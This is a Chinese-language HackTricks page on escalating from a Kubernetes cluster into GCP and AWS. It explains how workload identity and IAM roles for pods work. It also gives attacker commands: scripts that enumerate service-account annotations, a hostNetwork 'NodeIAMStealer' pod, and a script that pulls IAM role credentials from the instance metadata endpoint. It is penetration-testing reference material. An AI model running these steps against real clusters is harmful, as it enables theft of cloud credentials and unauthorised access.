# Kubernetes Pivoting to Clouds

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享您的黑客技巧。**

</details>

## GCP

如果您在 GCP 中运行一个 k8s 集群，您可能希望集群内的某些应用程序能够访问 GCP。有两种常见的方法可以实现这一点：

### 将 GCP-SA 密钥挂载为 secret

给 **kubernetes 应用程序访问 GCP** 的一种常见方法是：

* 创建一个 GCP 服务账号
* 绑定所需的权限到该账号上
* 下载创建的 SA 的 json 密钥
* 将其作为 secret 挂载到 pod 内部
* 设置 GOOGLE\_APPLICATION\_CREDENTIALS 环境变量，指向 json 文件的路径。

{% hint style="warning" %}
因此，作为一个 **攻击者**，如果您入侵了 pod 内部的容器，您应该检查是否存在具有 GCP 凭据的 **env** **variable** 和 **json** **files**。
{% endhint %}

### 将 GSA 的 json 关联到 KSA 的 secret

一种将 GSA 授权给 GKE 集群的方法是通过以下方式绑定它们：

* 使用以下命令在与您的 GKE 集群相同的命名空间中创建一个 Kubernetes 服务账号：
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* 创建一个包含要授予访问 GKE 集群的 GCP 服务帐号凭据的 Kubernetes Secret。您可以使用 `gcloud` 命令行工具来完成此操作，如下所示的示例：
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* 使用以下命令将Kubernetes Secret绑定到Kubernetes服务账户：
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
在第二步中，将GSA的凭据设置为KSA的秘密。然后，如果您可以从GKE集群内部读取该秘密，则可以升级到该GCP服务帐户。
{% endhint %}

### GKE工作负载身份

使用工作负载身份，我们可以配置一个Kubernetes服务帐户来充当Google服务帐户。使用Kubernetes服务帐户运行的Pod在访问Google Cloud API时将自动作为Google服务帐户进行身份验证。

启用此行为的**第一系列步骤**是在GCP中启用工作负载身份（[步骤](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)）并创建您希望k8s冒充的GCP SA。

* 在新集群上**启用工作负载身份**

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
* **创建/更新新的节点池**（Autopilot集群不需要此操作）

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* 从K8s中创建具有GCP权限的**GCP服务帐号以模拟**：
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **连接**到**集群**并**创建**要使用的**服务帐户**

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **将GSA与KSA绑定**
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* 运行一个带有KSA的pod，并检查对GSA的访问权限：
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
{% hint style="warning" %}
作为K8s内部的攻击者，你应该搜索带有`iam.gke.io/gcp-service-account`注释的SA，因为这表示该SA可以访问GCP中的某些内容。另一个选项是尝试滥用集群中的每个KSA并检查其是否具有访问权限。\
从GCP方面来看，枚举绑定并了解你在Kubernetes中给予SA的访问权限总是很有趣的。
{% endhint %}

这是一个脚本，可以轻松地**遍历所有pod**定义，**查找**该**注释**：
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM（Pod的IAM角色）<a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

给Pod提供IAM角色的（过时的）方法是使用[Kiam](https://github.com/uswitch/kiam)或[Kube2IAM](https://github.com/jtblin/kube2iam)服务器。基本上，您需要在集群中运行一个具有某种特权IAM角色的**守护进程集**。这个守护进程集将为需要访问IAM角色的Pod提供访问权限。

首先，您需要配置**哪些角色可以在命名空间内访问**，可以通过在命名空间对象中添加注释来实现：

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

一旦命名空间配置了IAM角色，Pods可以使用以下方式指定您想要的角色：

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
作为攻击者，如果你在pod或命名空间中找到这些注释，或者在运行kiam/kube2iam服务器（可能在kube-system中），你可以冒充已经被pod使用的每个角色以及更多（如果你有访问AWS账户的权限，可以枚举角色）。
{% endhint %}

#### 使用IAM角色创建Pod

{% hint style="info" %}
要指定的IAM角色必须与kiam/kube2iam角色位于同一个AWS账户中，并且该角色必须能够访问它。
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### 通过OIDC为K8s服务账户创建IAM角色 <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

这是AWS推荐的方法。

1. 首先，您需要[为集群创建一个OIDC提供程序](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html)。
2. 然后，创建一个具有SA所需权限的IAM角色。
3. 创建一个[IAM角色和SA之间的信任关系](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html)，名称为（或者给予访问该角色的所有SA的命名空间）。_信任关系主要检查OIDC提供程序名称、命名空间名称和SA名称_。
4. 最后，**创建一个带有注释指示角色ARN的SA**，并且使用该SA运行的Pod将具有**访问角色的令牌**的权限。**令牌**被**写入**到一个文件中，路径在**`AWS_WEB_IDENTITY_TOKEN_FILE`**中指定（默认为`/var/run/secrets/eks.amazonaws.com/serviceaccount/token`）。
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
要使用`/var/run/secrets/eks.amazonaws.com/serviceaccount/token`中的令牌来获取aws，请运行以下命令：

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
作为攻击者，如果你能枚举一个K8s集群，检查是否有带有该注释的**服务账户**以**升级到AWS**。要做到这一点，只需使用其中一个IAM**特权服务账户**执行/创建一个**pod**并窃取令牌。

此外，如果你在一个pod内部，检查环境变量，如**AWS\_ROLE\_ARN**和**AWS\_WEB\_IDENTITY\_TOKEN**。
{% endhint %}

{% hint style="danger" %}
有时，**角色的信任策略**可能配置错误，而不是将AssumeRole访问权限授予预期的服务账户，而是授予**所有服务账户**。因此，如果你能在受控服务账户上写入注释，你就可以访问该角色。

请查看**以下页面获取更多信息**：
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### 在集群中查找带有IAM角色的Pod和SA

这是一个脚本，可以轻松地**遍历所有的pod和sa**定义，**查找**带有该**注释**的内容：
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### 节点 IAM 角色

前面的部分是关于如何通过 pod 偷取 IAM 角色的，但请注意，K8s 集群的**节点将成为云中的实例**。这意味着节点很有可能会**拥有一个你可以窃取的新 IAM 角色**（请注意，通常 K8s 集群的所有节点都会拥有相同的 IAM 角色，所以尝试检查每个节点可能不值得）。

然而，要访问节点的元数据端点，有一个重要的要求，你需要在节点上（ssh 会话？）或者至少在相同的网络中：
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### 偷取 IAM 角色令牌

之前我们已经讨论了如何将 IAM 角色附加到 Pod 上，甚至如何逃逸到节点上来窃取实例所附加的 IAM 角色。

您可以使用以下脚本来窃取您辛苦工作的新 IAM 角色凭证：
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## 参考资料

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF 版本，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获得[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享您的黑客技巧。**

</details>
